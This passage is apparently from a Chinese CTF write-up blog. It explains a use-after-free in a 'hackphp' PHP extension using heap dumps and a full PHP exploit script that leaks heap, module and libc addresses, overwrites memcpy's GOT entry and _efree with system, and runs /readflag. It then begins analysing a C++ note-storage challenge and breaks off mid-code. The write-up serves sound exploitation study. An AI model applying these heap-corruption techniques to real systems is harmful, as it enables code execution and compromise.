*/</span></span></span><br></pre></td></tr></table></figure><p>申请内存空间时，大小向上对齐。</p><p>而空闲chunk的维护，也是通过一个单链表，即chunk中存在一个fd指针，指向下一个空闲chunk，当链表中最后一个chunk被申请出去时，其fd=0，则说明空闲chunk已被用完，之后再申请会从新的page中产生。</p><p>同样地在释放的时候，并不是任意内存均可被<code>_efree</code>，这里仅根据调试结果来看，应该需要位于特定的page中。</p></li><li><p>因此根据上面的管理机制，注意到对于size处于225~256时，申请出的chunk大小都是256，但是不同的是，只有size=256时，才能不触发<code>_efree</code>，否则会被立刻<code>_efree</code>。</p></li><li><p>同时在调试过程中发现，在申请第一个0x100的chunk时，存在残留的地址信息，其中有一项指向php进程的heap区域，而该区域正好存在hackphp.so中的函数地址，因此只要利用uaf，申请到该区域的内存，就能实现leak，得到hackphp.so的基址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tele 0x00007fa5c088e000</span><br><span class="line">0x00007fa5c088e000│+0x0000: "aaaaaaaabbbbbbbbccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e008│+0x0008: "bbbbbbbbccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e010│+0x0010: "ccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e018│+0x0018: "dddddddd"</span><br><span class="line">0x00007fa5c088e020│+0x0020: 0x000055b970154f00  →  0x000001c600000001  ==&gt; remained data</span><br><span class="line">0x00007fa5c088e028│+0x0028: 0x0000000000000006</span><br><span class="line">0x00007fa5c088e030│+0x0030: 0x00007fa5c0872200  →  0x0000004600000001</span><br><span class="line">0x00007fa5c088e038│+0x0038: 0x0000000000000006</span><br><span class="line">0x00007fa5c088e040│+0x0040: 0x000055b970155060  →  0x000001c600000001</span><br><span class="line">0x00007fa5c088e048│+0x0048: 0x0000000000000006</span><br><span class="line">gef➤  tele 0x000055b970154f00 50</span><br><span class="line">0x000055b970154f00│+0x0000: 0x000001c600000001</span><br><span class="line">0x000055b970154f08│+0x0008: 0xd304f972b2628589</span><br><span class="line">0x000055b970154f10│+0x0010: 0x000000000000000c</span><br><span class="line">0x000055b970154f18│+0x0018: "hackphp_edit"</span><br><span class="line">0x000055b970154f20│+0x0020: 0x0000000074696465 ("edit"?)</span><br><span class="line">0x000055b970154f28│+0x0028: 0x0000000000000081</span><br><span class="line">0x000055b970154f30│+0x0030: 0x0000000100000001</span><br><span class="line">0x000055b970154f38│+0x0038: 0x000055b970154f00  →  0x000001c600000001</span><br><span class="line">0x000055b970154f40│+0x0040: 0x0000000000000000</span><br><span class="line">0x000055b970154f48│+0x0048: 0x0000000000000000</span><br><span class="line">0x000055b970154f50│+0x0050: 0x0000000100000001</span><br><span class="line">0x000055b970154f58│+0x0058: 0x00007fa5c3073cb8  →  0x00007fa5c3072095  →  0x6c62757000727473 ("str"?)</span><br><span class="line">0x000055b970154f60│+0x0060: 0x00007fa5c3071480  →  &lt;zif_hackphp_edit+0&gt; endbr64   ==&gt; hackphp.so</span><br><span class="line">0x000055b970154f68│+0x0068: 0x000055b970154da0  →  0x013416b6000000a8</span><br><span class="line">0x000055b970154f70│+0x0070: 0x0000000000000000</span><br><span class="line">0x000055b970154f78│+0x0078: 0x0000000000000000</span><br><span class="line">0x000055b970154f80│+0x0080: 0x0000000000000000</span><br><span class="line">0x000055b970154f88│+0x0088: 0x0000000000000000</span><br><span class="line">0x000055b970154f90│+0x0090: 0x0000000000000000</span><br><span class="line">0x000055b970154f98│+0x0098: 0x0000000000000000</span><br><span class="line">0x000055b970154fa0│+0x00a0: 0x0000000000000000</span><br><span class="line">0x000055b970154fa8│+0x00a8: 0x0000000000000031 ("1"?)</span><br><span class="line">0x000055b970154fb0│+0x00b0: 0x000001c600000001</span><br><span class="line">0x000055b970154fb8│+0x00b8: 0xa82920e8d2d87056</span><br><span class="line">0x000055b970154fc0│+0x00c0: 0x000000000000000e</span><br><span class="line">0x000055b970154fc8│+0x00c8: "hackphp_delete"</span><br><span class="line">0x000055b970154fd0│+0x00d0: 0x00006574656c6564 ("delete"?)</span><br><span class="line">0x000055b970154fd8│+0x00d8: 0x0000000000000081</span><br><span class="line">0x000055b970154fe0│+0x00e0: 0x0000000100000001</span><br><span class="line">0x000055b970154fe8│+0x00e8: 0x000055b970154fb0  →  0x000001c600000001</span><br><span class="line">0x000055b970154ff0│+0x00f0: 0x0000000000000000</span><br><span class="line">0x000055b970154ff8│+0x00f8: 0x0000000000000000</span><br><span class="line">0x000055b970155000│+0x0100: 0x0000000000000000</span><br><span class="line">0x000055b970155008│+0x0108: 0x0000000000000000</span><br><span class="line">0x000055b970155010│+0x0110: 0x00007fa5c3071420  →  &lt;zif_hackphp_delete+0&gt; endbr64  ==&gt; hackphp.so</span><br><span class="line">0x000055b970155018│+0x0118: 0x000055b970154da0  →  0x013416b6000000a8</span><br><span class="line">0x000055b970155020│+0x0120: 0x0000000000000000</span><br><span class="line">0x000055b970155028│+0x0128: 0x0000000000000000</span><br><span class="line">0x000055b970155030│+0x0130: 0x0000000000000000</span><br><span class="line">0x000055b970155038│+0x0138: 0x0000000000000000</span><br><span class="line">0x000055b970155040│+0x0140: 0x0000000000000000</span><br><span class="line">0x000055b970155048│+0x0148: 0x0000000000000000</span><br><span class="line">0x000055b970155050│+0x0150: 0x0000000000000000</span><br><span class="line">0x000055b970155058│+0x0158: 0x0000000000000031 ("1"?)</span><br><span class="line">0x000055b970155060│+0x0160: 0x000001c600000001</span><br><span class="line">0x000055b970155068│+0x0168: 0xc0938b7014ebbf23</span><br><span class="line">0x000055b970155070│+0x0170: 0x000000000000000b</span><br><span class="line">0x000055b970155078│+0x0178: "hackphp_get"</span><br><span class="line">0x000055b970155080│+0x0180: 0x0000000000746567 ("get"?)</span><br><span class="line">0x000055b970155088│+0x0188: 0x0000000000000081</span><br></pre></td></tr></table></figure><p>这里发现调试的时候，残留的heap地址不是固定的，可能重启下就又换了个地址，但是并不影响后续利用，如果出现如上的情况只要<code>hackphp_edit</code>的时候多写一个字节，然后算地址的时候处理一下即可。</p></li><li><p>得到hackphp.so的基址，加上任意地址写，就能够完全控制全局变量<code>buf</code>；不过这里要注意一下，<code>_emalloc</code>到任意地址的时候，要注意该地址的fake chunk-&gt;fd要么指向可写地址，原因是打印的时候也会触发<code>_emalloc</code>；要么直接为0，这样下一次<code>_emalloc</code>就会重新分配新的page，不会破坏内存。</p></li><li><p>因此利用的思路为：</p><ul><li>首先正常<code>_emalloc(0x100)</code>，leak出php进程的heap地址。</li><li>之后通过uaf，申请到该heap中的内存，通过<code>zif_hackphp_get</code>得到hackphp.so的加载基址。</li><li>继续通过uaf，申请到全局变量buf所在的内存空间，覆盖buf指向<code>memcpy_got</code>。</li><li>通过<code>zif_hackphp_get</code>得到<code>memcpy</code>的地址，计算出libc基址和<code>system</code>的地址。</li><li>再通过<code>zif_hackphp_edit</code>覆盖<code>memcpy_got</code>处为<code>/readflag</code>，以及覆盖<code>_efree</code>为<code>system</code>。</li><li>最后调用<code>zif_hackphp_delete</code>触发<code>system</code>。</li></ul></li><li><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $hex = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = strlen($str) - <span class="number">1</span>;$i &gt;= <span class="number">0</span>;$i--) $hex.= dechex(ord($str[$i]));</span><br><span class="line">    $hex = strtoupper($hex);</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToStr</span><span class="params">($hex)</span> </span>&#123;</span><br><span class="line">$hex = sprintf(<span class="string">"%08x"</span>, $hex);</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = strlen($hex) - <span class="number">2</span>;$i &gt;= <span class="number">0</span>;$i -= <span class="number">2</span>) $str.= chr(hexdec($hex[$i] . $hex[$i + <span class="number">1</span>]));</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $fp = fopen(<span class="string">'/dev/stdin'</span>, <span class="string">'r'</span>);</span><br><span class="line">    $input = fgets($fp, <span class="number">255</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    $input = chop($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">echo</span> read();</span><br><span class="line">hackphp_edit(<span class="string">"aaaaaaaabbbbbbbbccccccccdddddddd"</span>);</span><br><span class="line">$a = hackphp_get();</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> strlen($a);</span><br><span class="line">$heap_addr = substr($a, <span class="number">-6</span>);</span><br><span class="line"><span class="keyword">echo</span> $heap_addr.<span class="string">"\n"</span>;</span><br><span class="line">$heap_addrn = base_convert(strTohex($heap_addr),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> $heap_addrn;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">hackphp_create(<span class="number">0xff</span>);</span><br><span class="line">hackphp_edit(hexToStr($heap_addrn + <span class="number">0xf8</span>));</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_edit(<span class="string">"aaaaaaaabbbbbbbbcccccccc"</span>);</span><br><span class="line"></span><br><span class="line">$edit_addr = substr(hackphp_get(), <span class="number">-6</span>);</span><br><span class="line">$edit_addrn = base_convert(strTohex($edit_addr),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">$buf_addrn = $edit_addrn - <span class="number">0x1420</span> + <span class="number">0x4178</span>;</span><br><span class="line"><span class="keyword">echo</span> $buf_addrn;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$buf_addr = hexToStr($buf_addrn<span class="number">-0x10</span>);</span><br><span class="line">$vline = $heap_addrn + <span class="number">0xC8090</span>;</span><br><span class="line">$memcpy_got = $edit_addrn<span class="number">-0x1420</span>+<span class="number">0x4060</span>;</span><br><span class="line"></span><br><span class="line">hackphp_create(<span class="number">0xff</span>);</span><br><span class="line">hackphp_edit($buf_addr);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">$payload = <span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>.hexToStr($vline).<span class="string">"\x00\x00"</span>.hexToStr($memcpy_got);</span><br><span class="line">hackphp_edit($payload);</span><br><span class="line">$libc = hackphp_get();</span><br><span class="line">$libcn = base_convert(strToHex($libc),<span class="number">16</span>,<span class="number">10</span>) - <span class="number">0x18e670</span>;</span><br><span class="line">$system_addr = $libcn + <span class="number">0x55410</span>; </span><br><span class="line"><span class="keyword">echo</span> $libcn;</span><br><span class="line">$pay = <span class="string">"/readflag\x00\x00\x00\x00\x00\x00\x00"</span>.chr($system_addr &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">hackphp_edit($pay);</span><br><span class="line">hackphp_delete();</span><br><span class="line"><span class="comment">// echo read();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>附上调试过程中踩到的坑：</p><ul><li><p>在调用<code>zif_hackphp_get</code>的时候，要保证此时内存状态是正常的，因为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_hackphp_get</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf &amp;&amp; buf_size )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = zend_strpprintf(<span class="number">0L</span>L, <span class="string">"%s"</span>, buf);</span><br><span class="line">    return_value-&gt;value.lval = v2;</span><br><span class="line">    return_value-&gt;u1.type_info = (*(_DWORD *)(v2 + <span class="number">4</span>) &amp; <span class="number">0x40</span>) == <span class="number">0</span> ? <span class="number">262</span> : <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>zend_strpprintf</code>会调用到<code>_emalloc</code>申请临时buffer，之后用完会释放，若此时内存状态不正常，就会crash。</p></li><li><p>调试的时候可以手动实现一个<code>read</code>的功能，将php断住，便于下断点。至于<code>fopen</code>被禁用的问题，可以修改<code>php.ini</code>中的<code>disable_function</code>，把<code>fopen</code>给删掉即可。</p></li></ul></li></ol><h1 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h1><ol><li><p>首先分析一下几个重要的结构体，以及各个菜单的功能：</p><ul><li><p>NoteStorageImpl：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteStorageImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member_1</span>;</span> <span class="comment">// offset = 0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member_2</span>;</span> <span class="comment">// offset = 8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteDBImpl</span> *<span class="title">house</span>;</span>  <span class="comment">// offset = 0x10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>NoteImpl:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *func_get_encourage; <span class="comment">// offset = 0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> vector_status;   <span class="comment">// offset = 8</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; buf_1;   <span class="comment">// offset = 0x10</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; buf_2;  <span class="comment">// offset = 0x1A0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">malloc</span>;  <span class="comment">// offset = 0x1B8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>NoteDBImpl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteDBImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> status;       <span class="comment">// offset = 0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member</span>;</span> <span class="comment">// offset = 8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>editHouse：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::editHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteImpl *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(<span class="keyword">this</span>) != <span class="number">1</span> )</span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="built_in">get</span>((__int64)<span class="keyword">this</span> + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="built_in">get</span>((__int64)<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> NoteImpl::add(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断<code>NoteStorageImpl</code>中的<code>member_1</code>是否为空，若不为空，则操作<code>member_1</code>，否则操作<code>member_2</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __fastcall NoteImpl::add(NoteImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Do you want to clear it?(y/N)"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="string">'y'</span> &amp;&amp; *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"you can only clear once!!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::clear((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">      *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"content(q to quit):"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_QWORD *)<span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::ios::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)v4 + *(_QWORD *)(*v4 - <span class="number">0x18</span>LL)) || v7 == <span class="string">'q'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::size((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">0x10</span>) &gt; <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"nonono!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::push_back((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>, &amp;v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体<code>NoteImpl</code>成员<code>buf_1</code>都有一次<code>clear</code>的机会，除此之外，只能通过<code>push_back</code>追加，总长度最多为0x1000。</p></li><li><p>saveHouse：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::saveHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  NoteImpl *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(<span class="keyword">this</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span>);</span><br><span class="line">    result = NoteImpl::save(v1);</span><br><span 